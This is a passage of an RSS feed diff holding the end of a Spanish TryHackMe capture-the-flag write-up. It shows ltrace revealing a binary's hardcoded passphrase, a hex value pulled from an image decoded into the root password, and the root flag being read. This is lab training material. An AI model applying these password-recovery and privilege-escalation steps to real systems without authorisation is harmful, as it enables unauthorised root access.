+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;hakanbey@ubuntu:/$ ltrace /usr/bin/binary
+strcat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;war&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;zone&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                            &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;warzone&amp;#34;&lt;/span&gt;
+strcat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;warzone&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;in&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                          &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;warzonein&amp;#34;&lt;/span&gt;
+strcat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;warzonein&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;ada&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                       &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;warzoneinada&amp;#34;&lt;/span&gt;
+strcat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;warzoneinada&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;na&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                     &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;warzoneinadana&amp;#34;&lt;/span&gt;
+printf&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;I think you should enter the cor&amp;#34;&lt;/span&gt;...&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;52&lt;/span&gt;
+ 123adanasubaru
+ 123adanasubaru
+&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+strcmp&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;123adanasubaru&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;warzoneinadana&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;       &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; -70
+strcat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pki&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;l&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                               &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;pkil&amp;#34;&lt;/span&gt;
+strcat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pkil&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;l&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                              &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;pkill&amp;#34;&lt;/span&gt;
+strcat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pkill&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34; -9&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                           &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;pkill -9&amp;#34;&lt;/span&gt;
+strcat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pkill -9&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34; -t&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                        &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;pkill -9 -t&amp;#34;&lt;/span&gt;
+strcat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pkill -9 -t&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34; pts&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;pkill -9 -t pts&amp;#34;&lt;/span&gt;
+strcat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pkill -9 -t pts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;/0&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;pkill -9 -t pts/0&amp;#34;&lt;/span&gt;
+system&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pkill -9 -t pts/0&amp;#34;&lt;/span&gt;pkill: killing pid &lt;span class=&#34;m&#34;&gt;1791&lt;/span&gt; failed: Operation not permitted
+pkill: killing pid &lt;span class=&#34;m&#34;&gt;1829&lt;/span&gt; failed: Operation not permitted
+www-data@ubuntu:/$
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Al ingresar la frase correcta nos muestra una pista y que se realizo una copia de un archivo JPG a nuestra carpeta principal.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;hakanbey@ubuntu:~$ /usr/bin/binary
+warzoneinadana
+Hint! : Hexeditor &lt;span class=&#34;nv&#34;&gt;00000020&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; ???? &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; /home/hakanbey/Desktop/root.jpg &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;CyberChef&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+
+Copy /root/root.jpg &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; /home/hakanbey/root.jpg
+hakanbey@ubuntu:~$ ls -lah /home/hakanbey/root.jpg
+-rw-rw-r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root hakanbey 45K Apr &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt; 00:46 /home/hakanbey/root.jpg
+hakanbey@ubuntu:~$
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Realizamos la ejecucion de multiples herramientas de esteganografia a la imagen pero no encontramos algun string o pista dentro de esta.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;╭─kali@kali ~/Pictures  
+╰─➤  xxd root.jpg&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;head                     
+00000000: ffd8 ffe0 &lt;span class=&#34;m&#34;&gt;0010&lt;/span&gt; 4a46 &lt;span class=&#34;m&#34;&gt;4946&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0001&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0101&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0060&lt;/span&gt;  ......JFIF.....&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
+00000010: &lt;span class=&#34;m&#34;&gt;0060&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; ffe1 &lt;span class=&#34;m&#34;&gt;0078&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;4578&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6966&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; 4d4d  .&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;.....xExif..MM
+00000020: fee9 9d3d &lt;span class=&#34;m&#34;&gt;7918&lt;/span&gt; 5ffc 826d df1c 69ac c275  ...&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;y._..m..i..u
+00000030: &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0056&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0301&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0005&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0001&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0068&lt;/span&gt;  ...V...........h
+00000040: &lt;span class=&#34;m&#34;&gt;0303&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0001&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0001&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5110&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0001&lt;/span&gt;  ............Q...
+00000050: &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0001&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0100&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5111&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0004&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0001&lt;/span&gt;  ........Q.......
+00000060: &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; 0ec4 &lt;span class=&#34;m&#34;&gt;5112&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0004&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0001&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; 0ec4  ....Q...........
+00000070: &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;4164&lt;/span&gt; 6f62 &lt;span class=&#34;m&#34;&gt;6520&lt;/span&gt; 496d &lt;span class=&#34;m&#34;&gt;6167&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6552&lt;/span&gt;  ....Adobe ImageR
+00000080: &lt;span class=&#34;m&#34;&gt;6561&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6479&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0001&lt;/span&gt; 86a0 &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; b18f ffdb  eady............
+00000090: &lt;span class=&#34;m&#34;&gt;0043&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0101&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0201&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0102&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0202&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0202&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0202&lt;/span&gt;  .C..............
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Despues de dar varias vueltas con herramientas de esteganografia, vemos que la pista se refiere a un indice &lt;code&gt;00000020&lt;/code&gt; del archivo, obtuvimos el valor hexadecimal.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;╭─kali@kali ~/Pictures
+╰─➤  xxd -s 0x20 -l &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; -c &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; root.jpg
+00000020: fee9 9d3d &lt;span class=&#34;m&#34;&gt;7918&lt;/span&gt; 5ffc 826d df1c 69ac c275  ...&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;y._..m..i..u
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Y utilizando cyberchef logramos obtener la contraseña del usuario root.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/differentctf/Screenshot_15.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Cambiamos al usuario root y logramos obtener nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@ubuntu:~# ls -lah
+total 92K
+drwx------  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; root root 4.0K Mar &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; 13:04 .
+drwxr-xr-x &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt; root root 4.0K Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 17:12 ..
+lrwxrwxrwx  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root    &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 18:12 .bash_history -&amp;gt; /dev/null
+-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root 3.1K Apr  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; .bashrc
+drwx------  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root root 4.0K Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 18:25 .cache
+drwx------  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root root 4.0K Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 20:43 .gnupg
+-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root   &lt;span class=&#34;m&#34;&gt;76&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 11:33 hint.txt
+drwxr-xr-x  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root root 4.0K Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 20:13 .local
+-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root  &lt;span class=&#34;m&#34;&gt;148&lt;/span&gt; Aug &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2015&lt;/span&gt; .profile
+-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root  45K Jan &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 09:57 root.jpg
+-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root   &lt;span class=&#34;m&#34;&gt;38&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 16:21 root.txt
+drwxr-xr-x  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root root 4.0K Jan &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 10:49 .rpmdb
+drwx------  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root root 4.0K Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 17:20 .ssh
+root@ubuntu:~# cat hint.txt
+Hexeditor &lt;span class=&#34;nv&#34;&gt;00000020&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; ???? &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; /home/hakanbey/Desktop/root.jpg &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;CyberChef&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+root@ubuntu:~# cat root.txt
+THM&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;YOU_GOT_IT_THIS_IS_YOUR_FLAG&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+root@ubuntu:~#
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</content:encoded>
+        <dc:creator>sckull</dc:creator>
+        <media:content url="https://sckull.github.io/images/posts/thm/differentctf/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        <media:content url="https://sckull.github.io/images/posts/thm/differentctf/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
+        
+          
+            
+              <category>sucrack</category>
+            
+          
+            
+              <category>wordpress</category>
+            
+          
+            
+              <category>wpscan</category>
+            
+          
+            
+              <category>phpmyadmin</category>
+            
+          
+            
+              <category>steganography</category>
+            
+          
+            
+              <category>hex</category>
+            
+          
+            
+              <category>xxd</category>
+            
+          
+            
+              <category>ftp</category>
+            
+          
+            
+              <category>ltrace</category>
+            
+          
+        
+        
+          
+            
+              <category>tryhackme</category>
+            
+          
+            
+              <category>linux</category>
+            
+          
+        
+        
+      </item>
       
       <item>
         <title>CyberSecLabs - Office</title>
